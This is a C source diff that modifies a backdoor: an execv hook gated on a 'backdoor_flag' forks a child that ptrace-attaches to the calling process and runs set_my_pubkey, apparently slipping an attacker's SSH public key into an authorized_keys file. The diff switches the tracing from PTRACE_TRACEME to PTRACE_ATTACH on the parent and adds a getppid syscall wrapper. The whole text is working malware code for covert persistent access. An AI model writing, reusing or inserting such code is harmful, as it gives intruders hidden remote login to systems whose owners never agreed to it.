@@ -30,6 +30,8 @@ int sys_fork ();
 
 void sys_write (int fd, char *buf, uint32_t size);
 
+int sys_getppid ();
+
 __attribute_noinline__ void call_execv (const char *path, char *const argv[]);
 
 void copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len);
@@ -63,13 +65,12 @@ execv_hook (const char *path, char *const argv[])
   if (*backdoor_flag != 16)
     call_execv (path, argv);
 
-  uint32_t pid;
-  if ((pid = sys_fork ()) == 0)
-    {
-      sys_ptrace (PTRACE_TRACEME, 0, NULL, NULL);
-      call_execv (path, argv);
-    }
+  uint32_t pid = sys_fork ();
+  if (pid != 0)
+    call_execv (path, argv);
 
+  pid = sys_getppid ();
+  sys_ptrace (PTRACE_ATTACH, pid, NULL, NULL);
   sys_wait (pid);
   sys_ptrace (PTRACE_SETOPTIONS, pid, NULL, (void *)PTRACE_O_TRACESYSGOOD);
   set_my_pubkey (pid);
@@ -86,8 +87,8 @@ execv_hook (const char *path, char *const argv[])
 void
 set_my_pubkey (uint32_t pid)
 {
-  __attribute__((nonstring)) char authorized_key[0x10] = SSH_AUTH_PATH;
-  __attribute__((nonstring)) char buf[0x10];
+  __attribute__ ((nonstring)) char authorized_key[0x10] = SSH_AUTH_PATH;
+  __attribute__ ((nonstring)) char buf[0x10];
 
   struct ptrace_syscall_info info;
   while (1)
@@ -121,6 +122,12 @@ void
 sys_write (int fd, char *buf, uint32_t size)
 {
   syscall3 (SYS_write, fd, (uint64_t)buf, size);
+}
+
+int
+sys_getppid ()
+{
+  return syscall0 (SYS_getppid);
 }
 
 void
